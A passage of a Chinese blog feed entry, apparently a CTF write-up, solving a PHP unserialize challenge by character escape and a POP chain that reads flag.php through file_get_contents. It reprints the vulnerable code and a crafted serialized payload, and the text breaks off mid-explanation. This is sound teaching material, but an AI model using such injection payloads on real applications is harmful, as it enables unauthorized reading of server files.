        <link rel="alternate" href="http://imfanqie.top/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/"/>
        <content type="html">&lt;p&gt;wtcl。。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web-unserialize&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-unserialize&#34;&gt;#&lt;/a&gt; web--unserialize&lt;/h1&gt;
&lt;p&gt;原码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Eileen&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Ava&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//waf 没有屏蔽重要信息，有数量变化，直接考虑字符逃逸&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Diana&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 创建对象时调用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Bella&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ico&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 销毁对象时调用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Carol&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 打印对象时调用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;//flag.php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;nice&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Diana&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;本题主要考察 pop 链&lt;/p&gt;
&lt;p&gt;看到最后一行和 waf，就能发现是字符逃逸，六个变三个，每次少三个&lt;/p&gt;
&lt;p&gt;通过_toString () 方法中的 file_get_contents () 函数来读取 flag.php 的源码&lt;/p&gt;
&lt;p&gt;在 Bella 中存在字符串的拼接操作  &lt;code&gt;$c = &#39;a&#39;.$this-&amp;gt;b&lt;/code&gt;  ，让此处的 $b 属性实例化为 Carol 对象即可触发__toString () 方法&lt;/p&gt;
&lt;p&gt;然后让类 Diana 的 password 属性为类 B 的实例化对象，进行序列化&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Bella&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Carol&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Diana&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;序列化后的结果&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token argument-name&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Diana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Bella&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Carol&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;c&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;flag.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为 a 和 b 参数是可以 get 的，所以可以用 a 逃掉中间的，再构造 b：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;password&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;O:5:&#34;&lt;/span&gt;Bella&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;:1:&amp;#123;s:1:&#34;&lt;/span&gt;b&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;O:5:&#34;&lt;/span&gt;Carol&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;:1:&amp;#123;s:1:&#34;&lt;/span&gt;c&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;flag&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;php&#34;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;现在需要知道源代码 get a 和 b 参数后序列化是什么样子，借助本地跑一下（&lt;em&gt;其实直接看就能猜出来，直接输入后直接序列化类 Diana，所以只有 username 和 password 两个参数，直接参考上面的序列化的一部分就可以了&lt;/em&gt;）：&lt;/p&gt;
